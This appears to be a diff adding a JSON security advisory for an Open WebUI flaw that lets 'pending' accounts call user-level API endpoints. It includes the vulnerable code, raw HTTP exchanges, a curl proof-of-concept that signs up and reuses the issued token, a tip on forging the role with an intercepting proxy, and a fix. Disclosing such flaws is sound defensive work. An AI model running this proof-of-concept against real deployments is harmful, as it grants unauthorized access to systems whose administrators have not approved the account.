@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-4vg5-rp28-gvjf",
+  "modified": "2026-05-08T22:56:21.540048Z",
+  "published": "2026-05-08T22:34:12Z",
+  "aliases": [
+    "CVE-2026-44567"
+  ],
+  "summary": "Open WebUI has Improper Authorization Control",
+  "details": "# **CONFIDENTIAL**\n\n# Vulnerability Disclosure Analysis Documentation\n\n---\n\n## Vulnerability Details\n\n| # | Field | Value |\n|---|-------|-------|\n| 1 | **Discoverer** | Taylor Pennington of KoreLogic, Inc. |\n| 2 | **Date Submitted** | June 11, 2024 |\n| 3 | **Title** | Open WebUI Improper Authorization Control |\n| 5 | **Affected Vendor** | Open WebUI |\n| 6 | **Affected Product(s)** | Open WebUI (Formerly Ollama WebUI) |\n| 7 | **Affected Version(s)** | 0.1.105 |\n| 8 | **Platform/OS** | Debian GNU/Linux 12 (bookworm) |\n| 9 | **Vector** | HTTP web interface |\n| 10 | **CWE** | 285 Improper Authorization |\n\n---\n\n## 4. High-level Summary\n\nThere is a missing authorization check affecting user accounts with a `pending` status allowing the user to make authenticated API calls as a `user` context.\n\n---\n\n## 11. Technical Analysis\n\nThe Open WebUI web application has three user role classifications: `user`, `admin`, and `pending`. By default, when Open WebUI is configured with `new sign-ups` enabled, the default user role is set to `pending`. In this configuration, an administrator is required to go into the Admin management panel following a new user registration and reconfigure the user to have a role of either `user` or `admin` before that user is able to access the web application. However, this check is only enforced at the client presentation layer, the API does not properly validate that the user has an authorized user role of `user`.\n\n### Request\n\n```http\nPOST /api/v1/auths/signup HTTP/1.1\nHost: openwebui.example.com\nContent-Length: 60\n\n{ \n \"name\": \"\", \n \"email\": \"bad_guy@korelogic.com\", \n \"password\": \"a\" \n }\n```\n\n### Response\n\n```http\nHTTP/1.1 200 OK\n...\n\n{\n\"id\": \"f839557a-031a-47a5-9999-0b0998f8f959\",\n\"email\": \"bad_guy@korelogic.com\",\n\"name\": \"\",\n\"role\": \"pending\",\n\"profile_image_url\": \"/user.png\",\n\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY4Mzk1NTdhLTAzMWEtNDdhNS05OTk5LTBiMDk5OGY4Zjk1OSJ9.Bk-S4ABXb1tRuiVNfOJYbQFB8ewixWA4a1FohvIZARs\",\n\"token_type\": \"Bearer\"\n}\n```\n\nAn attacker can then use the JWT in the above response to make direct API calls or they can forge the authentication response and use the web UI.\n\nWith the JWT, an attacker can now query the LLM. However, for this demonstration we will query the `/ollama/api/tags` endpoint and get a list of available models as this is an authenticated endpoint. Attempting to make this request without a valid JWT returns an HTTP `401 Unauthorized` response.\n\n### Request\n\n```http\nGET /ollama/api/tags HTTP/1.1\nHost: openwebui.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY4Mzk1NTdhLTAzMWEtNDdhNS05OTk5LTBiMDk5OGY4Zjk1OSJ9.Bk-S4ABXb1tRuiVNfOJYbQFB8ewixWA4a1FohvIZARs\n```\n\n### Response\n\n```http\nHTTP/1.1 200 OK\n...\n\n{\n\"models\": [\n    {\n    \"name\": \"ollama.com/emsi/mixtral-8x22b:latest\",\n    \"model\": \"ollama.com/emsi/mixtral-8x22b:latest\",\n    \"modified_at\": \"2024-04-12T17:27:51.479356401-04:00\",\n    \"size\": 79509285991,\n    \"digest\": \"9b000033acd802656a652c7df4e25300a61d903cd3c8eb065a50aaace484c319\",\n    \"details\": {\n        \"parent_model\": \"\",\n        \"format\": \"gguf\",\n        \"family\": \"llama\",\n        \"families\": [\"llama\"],\n        \"parameter_size\": \"141B\",\n        \"quantization_level\": \"Q4_0\"\n    },\n    \"urls\": [0]\n    },\n    ...\n]\n}\n```\n\nThe logic for this endpoint can be seen here:\n\u003chttps://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L163-L180\u003e\n\nAs shown below, the login checks if `url_idx` is `None` and if so, call `get_all_mdoels` and assign the result to `models` after that the logic checks if `app.state.MODEL_FILTER_ENABLED` is true and if not, it returns the result. As `MODEL_FILTER_ENABLED` is not configured by default, the application will not attempt to further validate the user.\n\n```python\n@app.get(\"/api/tags\")\n@app.get(\"/api/tags/{url_idx}\")\nasync def get_ollama_tags(\n    url_idx: Optional[int] = None, user=Depends(get_current_user)\n):\n    if url_idx == None:\n        models = await get_all_models()\n        \n        if app.state.MODEL_FILTER_ENABLED:\n            if user.role == \"user\":\n                models[\"models\"] = list(\n                    filter(\n                        lambda model: model[\"name\"] in app.state.MODEL_FILTER_LIST,\n                        models[\"models\"],\n                    )\n                )\n                return models\n        return models\n```\n\nThis is just an example of one API endpoint but all other regular user accessible endpoints were accessible to a pending user.\n\nThe vulnerability is caused by a missing authorization check that occurs with `user=Depends(get_current_user)`. The logic of that function is found here:\n\u003chttps://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L77-L97\u003e\n\n```python\ndef get_current_user(\nauth_token: HTTPAuthorizationCredentials = Depends(bearer_security),\n):\n    # auth by api key\n    if auth_token.credentials.startswith(\"sk-\"):\n        return get_current_user_by_api_key(auth_token.credentials)\n    # auth by jwt token\n    data = decode_token(auth_token.credentials)\n    if data != None and \"id\" in data:\n        user = Users.get_user_by_id(data[\"id\"])\n        if user is None:\n            raise HTTPException(\n                status_code=status.HTTP_401_UNAUTHORIZED,\n                detail=ERROR_MESSAGES.INVALID_TOKEN,\n            )\n        return user\n    else:\n        raise HTTPException(\n            status_code=status.HTTP_401_UNAUTHORIZED,\n            detail=ERROR_MESSAGES.UNAUTHORIZED,\n        )\n```\n\nAs shown above, this logic does not verify the role of the user, the function simples checks if the JWT is valid.\n\n---\n\n## 12. Proof-of-Concept\n\nFirst, verify that an unauthenticated user receives `{\"detail\":\"401 Unauthorized\"}`:\n\n```bash\ncurl -s -X $'GET' \\\n    -H $'Host: openwebui.example.com' \\\n    -H $'Content-Type: application/json' \\\n    $'https://openwebui.example.com/ollama/api/tags'\n```\n\nThe above curl command will return: `{\"detail\":\"401 Unauthorized\"}` as no Authorization Bearer token is provided.\n\nNow to access the authentication endpoint, two calls will be made. The first cURL creates an account and sets the `$JWT` environment variable which will be utilized in the subsequent cURL command.\n\n```bash\nexport JWT=$(curl -s -X POST \\\n    -H 'Host: openwebui.example.com' -H 'Content-Length: 60' \\\n    -H 'Content-Type: application/json' \\\n    --data '{\"name\":\"\",\"email\":\"bad_guy@korelogic.com\",\"password\":\"a\"}' \\\n    'https://openwebui.example.com/api/v1/auths/signup' | jq '.token'|tr -d '\"')\n\ncurl -v $'GET' \\\n    -H $'Host: openwebui.example.com' \\\n    -H $'Content-Type: application/json' \\\n    -H $'Authorization: Bearer ${JWT}' -H $'Content-Length: 2' \\\n    --data-binary $'\\x0d\\x0a' \\\n    $'https://openwebui.example.com/ollama/api/tags'\n```\n\nAdditionally the `\"role\":\"pending\"` value in the HTTP response can be forged from `POST /api/v1/auths/signin` and `GET /api/v1/auths/` to utilize the full website. This can be achieved with a man-in-the-middle proxy such as Burp or Zap and modifying `pending` to `user`.\n\n---\n\n## 13. Mitigation Recommendation\n\nThe application currently has a function for checking if the user is authorized. However, it is not being utilized except for one endpoint. See \u003chttps://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L110-L116\u003e for the correct function to use.\n\n```python\ndef get_verified_user(user=Depends(get_current_user)):\nif user.role not in {\"user\", \"admin\"}:\n    raise HTTPException(\n        status_code=status.HTTP_401_UNAUTHORIZED,\n        detail=ERROR_MESSAGES.ACCESS_PROHIBITED,\n    )\nreturn user\n```\n\nModify all authenticated endpoints to utilize `get_verified_user()` function instead of `get_current_user()`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "open-webui",
+        "purl": "pkg:pypi/open-webui"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.124"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.1.123",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-4vg5-rp28-gvjf/GHSA-4vg5-rp28-gvjf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-4vg5-rp28-gvjf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/open-webui/open-webui"
+    }
+  ]
+}
